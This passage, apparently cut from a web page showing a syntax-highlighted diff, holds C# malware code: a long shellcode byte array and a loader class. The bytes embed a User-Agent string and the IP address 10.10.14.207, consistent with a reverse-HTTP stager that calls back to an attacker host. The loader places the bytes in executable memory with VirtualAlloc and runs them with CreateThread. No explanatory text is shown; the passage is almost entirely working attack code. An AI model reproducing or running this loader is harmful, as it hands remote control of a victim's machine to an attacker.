class="m">0x6a</span><span class="p">,</span> <span class="m">0xff</span><span class="p">,</span> <span class="m">0x53</span><span class="p">,</span> <span class="m">0x56</span><span class="p">,</span> <span class="m">0x68</span><span class="p">,</span> <span class="m">0x2d</span><span class="p">,</span> <span class="m">0x06</span><span class="p">,</span> <span class="m">0x18</span><span class="p">,</span> <span class="m">0x7b</span><span class="p">,</span> <span class="m">0xff</span><span class="p">,</span> <span class="m">0xd5</span><span class="p">,</span> <span class="m">0x85</span><span class="p">,</span> <span class="m">0xc0</span><span class="p">,</span> <span class="m">0x0f</span><span class="p">,</span> <span class="m">0x84</span><span class="p">,</span> <span class="m">0xc3</span><span class="p">,</span> <span class="m">0x01</span><span class="p">,</span> <span class="m">0x00</span><span class="p">,</span> <span class="m">0x00</span><span class="p">,</span> <span class="m">0x31</span><span class="p">,</span> <span class="m">0xff</span><span class="p">,</span> <span class="m">0x85</span><span class="p">,</span> <span class="m">0xf6</span><span class="p">,</span> <span class="m">0x74</span><span class="p">,</span> <span class="m">0x04</span><span class="p">,</span> <span class="m">0x89</span><span class="p">,</span> <span class="m">0xf9</span><span class="p">,</span> <span class="m">0xeb</span><span class="p">,</span> <span class="m">0x09</span><span class="p">,</span> <span class="m">0x68</span><span class="p">,</span> <span class="m">0xaa</span><span class="p">,</span> <span class="m">0xc5</span><span class="p">,</span> <span class="m">0xe2</span><span class="p">,</span> <span class="m">0x5d</span><span class="p">,</span> <span class="m">0xff</span><span class="p">,</span> <span class="m">0xd5</span><span class="p">,</span> <span class="m">0x89</span><span class="p">,</span> <span class="m">0xc1</span><span class="p">,</span> <span class="m">0x68</span><span class="p">,</span> <span class="m">0x45</span><span class="p">,</span> <span class="m">0x21</span><span class="p">,</span> <span class="m">0x5e</span><span class="p">,</span> <span class="m">0x31</span><span class="p">,</span> <span class="m">0xff</span><span class="p">,</span> <span class="m">0xd5</span><span class="p">,</span> <span class="m">0x31</span><span class="p">,</span> <span class="m">0xff</span><span class="p">,</span> <span class="m">0x57</span><span class="p">,</span> <span class="m">0x6a</span><span class="p">,</span> <span class="m">0x07</span><span class="p">,</span> <span class="m">0x51</span><span class="p">,</span> <span class="m">0x56</span><span class="p">,</span> <span class="m">0x50</span><span class="p">,</span> <span class="m">0x68</span><span class="p">,</span> <span class="m">0xb7</span><span class="p">,</span> <span class="m">0x57</span><span class="p">,</span> <span class="m">0xe0</span><span class="p">,</span> <span class="m">0x0b</span><span class="p">,</span> <span class="m">0xff</span><span class="p">,</span> <span class="m">0xd5</span><span class="p">,</span> <span class="m">0xbf</span><span class="p">,</span> <span class="m">0x00</span><span class="p">,</span> <span class="m">0x2f</span><span class="p">,</span> <span class="m">0x00</span><span class="p">,</span> <span class="m">0x00</span><span class="p">,</span> <span class="m">0x39</span><span class="p">,</span> <span class="m">0xc7</span><span class="p">,</span> <span class="m">0x74</span><span class="p">,</span> <span class="m">0xb7</span><span class="p">,</span> <span class="m">0x31</span><span class="p">,</span> <span class="m">0xff</span><span class="p">,</span> <span class="m">0xe9</span><span class="p">,</span> <span class="m">0x91</span><span class="p">,</span> <span class="m">0x01</span><span class="p">,</span> <span class="m">0x00</span><span class="p">,</span> <span class="m">0x00</span><span class="p">,</span> <span class="m">0xe9</span><span class="p">,</span> <span class="m">0xc9</span><span class="p">,</span> <span class="m">0x01</span><span class="p">,</span> <span class="m">0x00</span><span class="p">,</span> <span class="m">0x00</span><span class="p">,</span> <span class="m">0xe8</span><span class="p">,</span> <span class="m">0x8b</span><span class="p">,</span> <span class="m">0xff</span><span class="p">,</span> <span class="m">0xff</span><span class="p">,</span> <span class="m">0xff</span><span class="p">,</span> <span class="m">0x2f</span><span class="p">,</span> <span class="m">0x6e</span><span class="p">,</span> <span class="m">0x68</span><span class="p">,</span> <span class="m">0x37</span><span class="p">,</span> <span class="m">0x4f</span><span class="p">,</span> <span class="m">0x00</span><span class="p">,</span> <span class="m">0x23</span><span class="p">,</span> <span class="m">0x6e</span><span class="p">,</span> <span class="m">0x65</span><span class="p">,</span> <span class="m">0x9b</span><span class="p">,</span> <span class="m">0xf6</span><span class="p">,</span> <span class="m">0x14</span><span class="p">,</span> <span class="m">0x96</span><span class="p">,</span> <span class="m">0x54</span><span class="p">,</span> <span class="m">0x0e</span><span class="p">,</span> <span class="m">0xd4</span><span class="p">,</span> <span class="m">0xa5</span><span class="p">,</span> <span class="m">0x23</span><span class="p">,</span> <span class="m">0x30</span><span class="p">,</span> <span class="m">0x34</span><span class="p">,</span> <span class="m">0x8c</span><span class="p">,</span> <span class="m">0x5d</span><span class="p">,</span> <span class="m">0x2c</span><span class="p">,</span> <span class="m">0x56</span><span class="p">,</span> <span class="m">0x03</span><span class="p">,</span> <span class="m">0x3f</span><span class="p">,</span> <span class="m">0x8d</span><span class="p">,</span> <span class="m">0x6a</span><span class="p">,</span> <span class="m">0x5a</span><span class="p">,</span> <span class="m">0x88</span><span class="p">,</span> <span class="m">0xb8</span><span class="p">,</span> <span class="m">0x51</span><span class="p">,</span> <span class="m">0xf4</span><span class="p">,</span> <span class="m">0x3c</span><span class="p">,</span> <span class="m">0x13</span><span class="p">,</span> <span class="m">0x01</span><span class="p">,</span> <span class="m">0x79</span><span class="p">,</span> <span class="m">0xc0</span><span class="p">,</span> <span class="m">0x47</span><span class="p">,</span> <span class="m">0x0b</span><span class="p">,</span> <span class="m">0x2c</span><span class="p">,</span> <span class="m">0x50</span><span class="p">,</span> <span class="m">0xde</span><span class="p">,</span> <span class="m">0x12</span><span class="p">,</span> <span class="m">0x37</span><span class="p">,</span> <span class="m">0x51</span><span class="p">,</span> <span class="m">0x60</span><span class="p">,</span> <span class="m">0x52</span><span class="p">,</span> <span class="m">0xfa</span><span class="p">,</span> <span class="m">0xd5</span><span class="p">,</span> <span class="m">0xe6</span><span class="p">,</span> <span class="m">0x15</span><span class="p">,</span> <span class="m">0xfa</span><span class="p">,</span> <span class="m">0xc8</span><span class="p">,</span> <span class="m">0xb8</span><span class="p">,</span> <span class="m">0x31</span><span class="p">,</span> <span class="m">0x99</span><span class="p">,</span> <span class="m">0xe4</span><span class="p">,</span> <span class="m">0x8e</span><span class="p">,</span> <span class="m">0x6a</span><span class="p">,</span> <span class="m">0x47</span><span class="p">,</span> <span class="m">0x04</span><span class="p">,</span> <span class="m">0xd1</span><span class="p">,</span> <span class="m">0x9c</span><span class="p">,</span> <span class="m">0xa1</span><span class="p">,</span> <span class="m">0xb1</span><span class="p">,</span> <span class="m">0xf3</span><span class="p">,</span> <span class="m">0xbf</span><span class="p">,</span> <span class="m">0x01</span><span class="p">,</span> <span class="m">0x2e</span><span class="p">,</span> <span class="m">0x32</span><span class="p">,</span> <span class="m">0xd1</span><span class="p">,</span> <span class="m">0xf1</span><span class="p">,</span> <span class="m">0xbb</span><span class="p">,</span> <span class="m">0xad</span><span class="p">,</span> <span class="m">0xd9</span><span class="p">,</span> <span class="m">0x7e</span><span class="p">,</span> <span class="m">0x26</span><span class="p">,</span> <span class="m">0x95</span><span class="p">,</span> <span class="m">0x00</span><span class="p">,</span> <span class="m">0x55</span><span class="p">,</span> <span class="m">0x73</span><span class="p">,</span> <span class="m">0x65</span><span class="p">,</span> <span class="m">0x72</span><span class="p">,</span> <span class="m">0x2d</span><span class="p">,</span> <span class="m">0x41</span><span class="p">,</span> <span class="m">0x67</span><span class="p">,</span> <span class="m">0x65</span><span class="p">,</span> <span class="m">0x6e</span><span class="p">,</span> <span class="m">0x74</span><span class="p">,</span> <span class="m">0x3a</span><span class="p">,</span> <span class="m">0x20</span><span class="p">,</span> <span class="m">0x4d</span><span class="p">,</span> <span class="m">0x6f</span><span class="p">,</span> <span class="m">0x7a</span><span class="p">,</span> <span class="m">0x69</span><span class="p">,</span> <span class="m">0x6c</span><span class="p">,</span> <span class="m">0x6c</span><span class="p">,</span> <span class="m">0x61</span><span class="p">,</span> <span class="m">0x2f</span><span class="p">,</span> <span class="m">0x35</span><span class="p">,</span> <span class="m">0x2e</span><span class="p">,</span> <span class="m">0x30</span><span class="p">,</span> <span class="m">0x20</span><span class="p">,</span> <span class="m">0x28</span><span class="p">,</span> <span class="m">0x63</span><span class="p">,</span> <span class="m">0x6f</span><span class="p">,</span> <span class="m">0x6d</span><span class="p">,</span> <span class="m">0x70</span><span class="p">,</span> <span class="m">0x61</span><span class="p">,</span> <span class="m">0x74</span><span class="p">,</span> <span class="m">0x69</span><span class="p">,</span> <span class="m">0x62</span><span class="p">,</span> <span class="m">0x6c</span><span class="p">,</span> <span class="m">0x65</span><span class="p">,</span> <span class="m">0x3b</span><span class="p">,</span> <span class="m">0x20</span><span class="p">,</span> <span class="m">0x4d</span><span class="p">,</span> <span class="m">0x53</span><span class="p">,</span> <span class="m">0x49</span><span class="p">,</span> <span class="m">0x45</span><span class="p">,</span> <span class="m">0x20</span><span class="p">,</span> <span class="m">0x39</span><span class="p">,</span> <span class="m">0x2e</span><span class="p">,</span> <span class="m">0x30</span><span class="p">,</span> <span class="m">0x3b</span><span class="p">,</span> <span class="m">0x20</span><span class="p">,</span> <span class="m">0x57</span><span class="p">,</span> <span class="m">0x69</span><span class="p">,</span> <span class="m">0x6e</span><span class="p">,</span> <span class="m">0x64</span><span class="p">,</span> <span class="m">0x6f</span><span class="p">,</span> <span class="m">0x77</span><span class="p">,</span> <span class="m">0x73</span><span class="p">,</span> <span class="m">0x20</span><span class="p">,</span> <span class="m">0x4e</span><span class="p">,</span> <span class="m">0x54</span><span class="p">,</span> <span class="m">0x20</span><span class="p">,</span> <span class="m">0x36</span><span class="p">,</span> <span class="m">0x2e</span><span class="p">,</span> <span class="m">0x31</span><span class="p">,</span> <span class="m">0x3b</span><span class="p">,</span> <span class="m">0x20</span><span class="p">,</span> <span class="m">0x57</span><span class="p">,</span> <span class="m">0x4f</span><span class="p">,</span> <span class="m">0x57</span><span class="p">,</span> <span class="m">0x36</span><span class="p">,</span> <span class="m">0x34</span><span class="p">,</span> <span class="m">0x3b</span><span class="p">,</span> <span class="m">0x20</span><span class="p">,</span> <span class="m">0x54</span><span class="p">,</span> <span class="m">0x72</span><span class="p">,</span> <span class="m">0x69</span><span class="p">,</span> <span class="m">0x64</span><span class="p">,</span> <span class="m">0x65</span><span class="p">,</span> <span class="m">0x6e</span><span class="p">,</span> <span class="m">0x74</span><span class="p">,</span> <span class="m">0x2f</span><span class="p">,</span> <span class="m">0x35</span><span class="p">,</span> <span class="m">0x2e</span><span class="p">,</span> <span class="m">0x30</span><span class="p">,</span> <span class="m">0x3b</span><span class="p">,</span> <span class="m">0x20</span><span class="p">,</span> <span class="m">0x4d</span><span class="p">,</span> <span class="m">0x41</span><span class="p">,</span> <span class="m">0x4c</span><span class="p">,</span> <span class="m">0x43</span><span class="p">,</span> <span class="m">0x4a</span><span class="p">,</span> <span class="m">0x53</span><span class="p">,</span> <span class="m">0x29</span><span class="p">,</span> <span class="m">0x0d</span><span class="p">,</span> <span class="m">0x0a</span><span class="p">,</span> <span class="m">0x00</span><span class="p">,</span> <span class="m">0x8b</span><span class="p">,</span> <span class="m">0x10</span><span class="p">,</span> <span class="m">0x65</span><span class="p">,</span> <span class="m">0x14</span><span class="p">,</span> <span class="m">0xf4</span><span class="p">,</span> <span class="m">0x7e</span><span class="p">,</span> <span class="m">0xec</span><span class="p">,</span> <span class="m">0x01</span><span class="p">,</span> <span class="m">0xe9</span><span class="p">,</span> <span class="m">0x16</span><span class="p">,</span> <span class="m">0x2e</span><span class="p">,</span> <span class="m">0x3d</span><span class="p">,</span> <span class="m">0x76</span><span class="p">,</span> <span class="m">0x34</span><span class="p">,</span> <span class="m">0x0d</span><span class="p">,</span> <span class="m">0x0e</span><span class="p">,</span> <span class="m">0xb1</span><span class="p">,</span> <span class="m">0x02</span><span class="p">,</span> <span class="m">0x56</span><span class="p">,</span> <span class="m">0x5b</span><span class="p">,</span> <span class="m">0xe4</span><span class="p">,</span> <span class="m">0x5a</span><span class="p">,</span> <span class="m">0x75</span><span class="p">,</span> <span class="m">0xbd</span><span class="p">,</span> <span class="m">0x32</span><span class="p">,</span> <span class="m">0xc5</span><span class="p">,</span> <span class="m">0xe3</span><span class="p">,</span> <span class="m">0x2c</span><span class="p">,</span> <span class="m">0xf1</span><span class="p">,</span> <span class="m">0x95</span><span class="p">,</span> <span class="m">0x36</span><span class="p">,</span> <span class="m">0x8a</span><span class="p">,</span> <span class="m">0x7f</span><span class="p">,</span> <span class="m">0x49</span><span class="p">,</span> <span class="m">0x9f</span><span class="p">,</span> <span class="m">0x0d</span><span class="p">,</span> <span class="m">0x4b</span><span class="p">,</span> <span class="m">0x50</span><span class="p">,</span> <span class="m">0x04</span><span class="p">,</span> <span class="m">0x46</span><span class="p">,</span> <span class="m">0x67</span><span class="p">,</span> <span class="m">0x3e</span><span class="p">,</span> <span class="m">0x0a</span><span class="p">,</span> <span class="m">0xf7</span><span class="p">,</span> <span class="m">0x36</span><span class="p">,</span> <span class="m">0xb8</span><span class="p">,</span> <span class="m">0xb5</span><span class="p">,</span> <span class="m">0x10</span><span class="p">,</span> <span class="m">0x2f</span><span class="p">,</span> <span class="m">0x26</span><span class="p">,</span> <span class="m">0xf3</span><span class="p">,</span> <span class="m">0x6e</span><span class="p">,</span> <span class="m">0x63</span><span class="p">,</span> <span class="m">0xc9</span><span class="p">,</span> <span class="m">0x7d</span><span class="p">,</span> <span class="m">0x78</span><span class="p">,</span> <span class="m">0x0f</span><span class="p">,</span> <span class="m">0x85</span><span class="p">,</span> <span class="m">0x20</span><span class="p">,</span> <span class="m">0x3c</span><span class="p">,</span> <span class="m">0x25</span><span class="p">,</span> <span class="m">0x78</span><span class="p">,</span> <span class="m">0x40</span><span class="p">,</span> <span class="m">0x30</span><span class="p">,</span> <span class="m">0x59</span><span class="p">,</span> <span class="m">0x61</span><span class="p">,</span> <span class="m">0x1b</span><span class="p">,</span> <span class="m">0x54</span><span class="p">,</span> <span class="m">0xdd</span><span class="p">,</span> <span class="m">0xa2</span><span class="p">,</span> <span class="m">0x4e</span><span class="p">,</span> <span class="m">0xae</span><span class="p">,</span> <span class="m">0x8b</span><span class="p">,</span> <span class="m">0x85</span><span class="p">,</span> <span class="m">0x84</span><span class="p">,</span> <span class="m">0xd3</span><span class="p">,</span> <span class="m">0x15</span><span class="p">,</span> <span class="m">0xd5</span><span class="p">,</span> <span class="m">0xeb</span><span class="p">,</span> <span class="m">0xac</span><span class="p">,</span> <span class="m">0x77</span><span class="p">,</span> <span class="m">0xdc</span><span class="p">,</span> <span class="m">0xa1</span><span class="p">,</span> <span class="m">0x4a</span><span class="p">,</span> <span class="m">0x40</span><span class="p">,</span> <span class="m">0x63</span><span class="p">,</span> <span class="m">0xb9</span><span class="p">,</span> <span class="m">0x0f</span><span class="p">,</span> <span class="m">0x3c</span><span class="p">,</span> <span class="m">0x77</span><span class="p">,</span> <span class="m">0x11</span><span class="p">,</span> <span class="m">0xde</span><span class="p">,</span> <span class="m">0x80</span><span class="p">,</span> <span class="m">0xd9</span><span class="p">,</span> <span class="m">0x52</span><span class="p">,</span> <span class="m">0x45</span><span class="p">,</span> <span class="m">0x52</span><span class="p">,</span> <span class="m">0x61</span><span class="p">,</span> <span class="m">0xec</span><span class="p">,</span> <span class="m">0x86</span><span class="p">,</span> <span class="m">0xd2</span><span class="p">,</span> <span class="m">0x3e</span><span class="p">,</span> <span class="m">0x3e</span><span class="p">,</span> <span class="m">0x6f</span><span class="p">,</span> <span class="m">0xb6</span><span class="p">,</span> <span class="m">0x77</span><span class="p">,</span> <span class="m">0x24</span><span class="p">,</span> <span class="m">0xf6</span><span class="p">,</span> <span class="m">0x69</span><span class="p">,</span> <span class="m">0xae</span><span class="p">,</span> <span class="m">0x4f</span><span class="p">,</span> <span class="m">0x01</span><span class="p">,</span> <span class="m">0xce</span><span class="p">,</span> <span class="m">0x3d</span><span class="p">,</span> <span class="m">0x18</span><span class="p">,</span> <span class="m">0x29</span><span class="p">,</span> <span class="m">0x29</span><span class="p">,</span> <span class="m">0x3d</span><span class="p">,</span> <span class="m">0xf6</span><span class="p">,</span> <span class="m">0x7a</span><span class="p">,</span> <span class="m">0xc9</span><span class="p">,</span> <span class="m">0x14</span><span class="p">,</span> <span class="m">0x25</span><span class="p">,</span> <span class="m">0x34</span><span class="p">,</span> <span class="m">0x2f</span><span class="p">,</span> <span class="m">0x57</span><span class="p">,</span> <span class="m">0x95</span><span class="p">,</span> <span class="m">0xbc</span><span class="p">,</span> <span class="m">0x26</span><span class="p">,</span> <span class="m">0xd5</span><span class="p">,</span> <span class="m">0x00</span><span class="p">,</span> <span class="m">0x17</span><span class="p">,</span> <span class="m">0x17</span><span class="p">,</span> <span class="m">0x00</span><span class="p">,</span> <span class="m">0x25</span><span class="p">,</span> <span class="m">0x59</span><span class="p">,</span> <span class="m">0xb6</span><span class="p">,</span> <span class="m">0xdc</span><span class="p">,</span> <span class="m">0x5e</span><span class="p">,</span> <span class="m">0xd7</span><span class="p">,</span> <span class="m">0x89</span><span class="p">,</span> <span class="m">0xfa</span><span class="p">,</span> <span class="m">0x11</span><span class="p">,</span> <span class="m">0x4b</span><span class="p">,</span> <span class="m">0x35</span><span class="p">,</span> <span class="m">0x04</span><span class="p">,</span> <span class="m">0x10</span><span class="p">,</span> <span class="m">0x57</span><span class="p">,</span> <span class="m">0x33</span><span class="p">,</span> <span class="m">0x25</span><span class="p">,</span> <span class="m">0x8f</span><span class="p">,</span> <span class="m">0xcd</span><span class="p">,</span> <span class="m">0x8f</span><span class="p">,</span> <span class="m">0x7c</span><span class="p">,</span> <span class="m">0x72</span><span class="p">,</span> <span class="m">0x12</span><span class="p">,</span> <span class="m">0x28</span><span class="p">,</span> <span class="m">0x7c</span><span class="p">,</span> <span class="m">0x1d</span><span class="p">,</span> <span class="m">0xad</span><span class="p">,</span> <span class="m">0xbb</span><span class="p">,</span> <span class="m">0x98</span><span class="p">,</span> <span class="m">0x0e</span><span class="p">,</span> <span class="m">0x63</span><span class="p">,</span> <span class="m">0xa3</span><span class="p">,</span> <span class="m">0x1b</span><span class="p">,</span> <span class="m">0x98</span><span class="p">,</span> <span class="m">0xc5</span><span class="p">,</span> <span class="m">0x68</span><span class="p">,</span> <span class="m">0x39</span><span class="p">,</span> <span class="m">0x08</span><span class="p">,</span> <span class="m">0xed</span><span class="p">,</span> <span class="m">0x5d</span><span class="p">,</span> <span class="m">0x16</span><span class="p">,</span> <span class="m">0xb8</span><span class="p">,</span> <span class="m">0x6a</span><span class="p">,</span> <span class="m">0xe5</span><span class="p">,</span> <span class="m">0xaa</span><span class="p">,</span> <span class="m">0xa9</span><span class="p">,</span> <span class="m">0x94</span><span class="p">,</span> <span class="m">0x82</span><span class="p">,</span> <span class="m">0x24</span><span class="p">,</span> <span class="m">0x7e</span><span class="p">,</span> <span class="m">0x0d</span><span class="p">,</span> <span class="m">0x8a</span><span class="p">,</span> <span class="m">0x0d</span><span class="p">,</span> <span class="m">0xbe</span><span class="p">,</span> <span class="m">0x0f</span><span class="p">,</span> <span class="m">0x19</span><span class="p">,</span> <span class="m">0x65</span><span class="p">,</span> <span class="m">0x86</span><span class="p">,</span> <span class="m">0xcd</span><span class="p">,</span> <span class="m">0x4a</span><span class="p">,</span> <span class="m">0xc2</span><span class="p">,</span> <span class="m">0x4b</span><span class="p">,</span> <span class="m">0xef</span><span class="p">,</span> <span class="m">0x55</span><span class="p">,</span> <span class="m">0x81</span><span class="p">,</span> <span class="m">0x74</span><span class="p">,</span> <span class="m">0xeb</span><span class="p">,</span> <span class="m">0x19</span><span class="p">,</span> <span class="m">0x82</span><span class="p">,</span> <span class="m">0x3e</span><span class="p">,</span> <span class="m">0x21</span><span class="p">,</span> <span class="m">0x68</span><span class="p">,</span> <span class="m">0xdb</span><span class="p">,</span> <span class="m">0x73</span><span class="p">,</span> <span class="m">0xdb</span><span class="p">,</span> <span class="m">0xee</span><span class="p">,</span> <span class="m">0x46</span><span class="p">,</span> <span class="m">0x00</span><span class="p">,</span> <span class="m">0x68</span><span class="p">,</span> <span class="m">0xf0</span><span class="p">,</span> <span class="m">0xb5</span><span class="p">,</span> <span class="m">0xa2</span><span class="p">,</span> <span class="m">0x56</span><span class="p">,</span> <span class="m">0xff</span><span class="p">,</span> <span class="m">0xd5</span><span class="p">,</span> <span class="m">0x6a</span><span class="p">,</span> <span class="m">0x40</span><span class="p">,</span> <span class="m">0x68</span><span class="p">,</span> <span class="m">0x00</span><span class="p">,</span> <span class="m">0x10</span><span class="p">,</span> <span class="m">0x00</span><span class="p">,</span> <span class="m">0x00</span><span class="p">,</span> <span class="m">0x68</span><span class="p">,</span> <span class="m">0x00</span><span class="p">,</span> <span class="m">0x00</span><span class="p">,</span> <span class="m">0x40</span><span class="p">,</span> <span class="m">0x00</span><span class="p">,</span> <span class="m">0x57</span><span class="p">,</span> <span class="m">0x68</span><span class="p">,</span> <span class="m">0x58</span><span class="p">,</span> <span class="m">0xa4</span><span class="p">,</span> <span class="m">0x53</span><span class="p">,</span> <span class="m">0xe5</span><span class="p">,</span> <span class="m">0xff</span><span class="p">,</span> <span class="m">0xd5</span><span class="p">,</span> <span class="m">0x93</span><span class="p">,</span> <span class="m">0xb9</span><span class="p">,</span> <span class="m">0x00</span><span class="p">,</span> <span class="m">0x00</span><span class="p">,</span> <span class="m">0x00</span><span class="p">,</span> <span class="m">0x00</span><span class="p">,</span> <span class="m">0x01</span><span class="p">,</span> <span class="m">0xd9</span><span class="p">,</span> <span class="m">0x51</span><span class="p">,</span> <span class="m">0x53</span><span class="p">,</span> <span class="m">0x89</span><span class="p">,</span> <span class="m">0xe7</span><span class="p">,</span> <span class="m">0x57</span><span class="p">,</span> <span class="m">0x68</span><span class="p">,</span> <span class="m">0x00</span><span class="p">,</span> <span class="m">0x20</span><span class="p">,</span> <span class="m">0x00</span><span class="p">,</span> <span class="m">0x00</span><span class="p">,</span> <span class="m">0x53</span><span class="p">,</span> <span class="m">0x56</span><span class="p">,</span> <span class="m">0x68</span><span class="p">,</span> <span class="m">0x12</span><span class="p">,</span> <span class="m">0x96</span><span class="p">,</span> <span class="m">0x89</span><span class="p">,</span> <span class="m">0xe2</span><span class="p">,</span> <span class="m">0xff</span><span class="p">,</span> <span class="m">0xd5</span><span class="p">,</span> <span class="m">0x85</span><span class="p">,</span> <span class="m">0xc0</span><span class="p">,</span> <span class="m">0x74</span><span class="p">,</span> <span class="m">0xc6</span><span class="p">,</span> <span class="m">0x8b</span><span class="p">,</span> <span class="m">0x07</span><span class="p">,</span> <span class="m">0x01</span><span class="p">,</span> <span class="m">0xc3</span><span class="p">,</span> <span class="m">0x85</span><span class="p">,</span> <span class="m">0xc0</span><span class="p">,</span> <span class="m">0x75</span><span class="p">,</span> <span class="m">0xe5</span><span class="p">,</span> <span class="m">0x58</span><span class="p">,</span> <span class="m">0xc3</span><span class="p">,</span> <span class="m">0xe8</span><span class="p">,</span> <span class="m">0xa9</span><span class="p">,</span> <span class="m">0xfd</span><span class="p">,</span> <span class="m">0xff</span><span class="p">,</span> <span class="m">0xff</span><span class="p">,</span> <span class="m">0x31</span><span class="p">,</span> <span class="m">0x30</span><span class="p">,</span> <span class="m">0x2e</span><span class="p">,</span> <span class="m">0x31</span><span class="p">,</span> <span class="m">0x30</span><span class="p">,</span> <span class="m">0x2e</span><span class="p">,</span> <span class="m">0x31</span><span class="p">,</span> <span class="m">0x34</span><span class="p">,</span> <span class="m">0x2e</span><span class="p">,</span> <span class="m">0x32</span><span class="p">,</span> <span class="m">0x30</span><span class="p">,</span> <span class="m">0x37</span><span class="p">,</span> <span class="m">0x00</span><span class="p">,</span> <span class="m">0x3a</span><span class="p">,</span> <span class="m">0xde</span><span class="p">,</span> <span class="m">0x68</span><span class="p">,</span> <span class="m">0xb1</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="k">class</span> <span class="nc">Run</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="na">        [DllImport(&#34;kernel32.dll&#34;)]</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kd">static</span> <span class="kd">extern</span> <span class="n">IntPtr</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">lpAddress</span><span class="p">,</span> <span class="kt">int</span> <span class="n">dwSize</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">flAllocationType</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">flProtect</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="na">
+</span></span></span><span class="line"><span class="cl"><span class="na">        [DllImport(&#34;kernel32.dll&#34;)]</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kd">static</span> <span class="kd">extern</span> <span class="n">IntPtr</span> <span class="n">CreateThread</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">lpThreadAttributes</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">dwStackSize</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpStartAddress</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpParameter</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">dwCreationFlags</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpThreadId</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="na">
+</span></span></span><span class="line"><span class="cl"><span class="na">        [DllImport(&#34;kernel32.dll&#34;)]</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kd">static</span> <span class="kd">extern</span> <span class="n">UInt32</span> <span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">hHandle</span><span class="p">,</span> <span class="n">UInt32</span> <span class="n">dwMilliseconds</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="n">Run</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">IntPtr</span> <span class="n">alloc</span> <span class="p">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="n">Globals</span><span class="p">.</span><span class="n">shellcode</span><span class="p">.</span><span class="n">Length</span><span class="p">,</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)(</span><span class="n">AllocationType</span><span class="p">.</span><span class="n">Commit</span> <span class="p">|</span> <span class="n">AllocationType</span><span class="p">.</span><span class="n">Reserve</span><span class="p">),</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)</span><span class="n">MemoryProtection</span><span class="p">.</span><span class="n">ExecuteReadWrite</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">alloc</span> <span class="p">==</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="n">Marshal</span><span class="p">.</span><span class="n">Copy</span><span class="p">(</span><span class="n">Globals</span><span class="p">.</span><span class="n">shellcode</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">alloc</span><span class="p">,</span> <span class="n">Globals</span><span class="p">.</span><span class="n">shellcode</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">IntPtr</span> <span class="n">threadHandle</span> <span class="p">=</span> <span class="n">CreateThread</span><span class="p">(</span><span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">alloc</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">threadHandle</span><span class="p">,</span> <span class="m">0xFFFFFFFF</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="na">    [Flags]</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">enum</span> <span class="n">FreeType</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Decommit</span> <span class="p">=</span> <span class="m">0x4000</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Release</span> <span class="p">=</span> <span class="m">0x8000</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="na">
+</span></span></span><span class="line"><span class="cl"><span class="na">    [Flags]</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">enum</span> <span class="n">AllocationType</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Commit</span> <span class="p">=</span> <span class="m">0x1000</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Reserve</span> <span class="p">=</span> <span class="m">0x2000</span><span class="p">,</span>
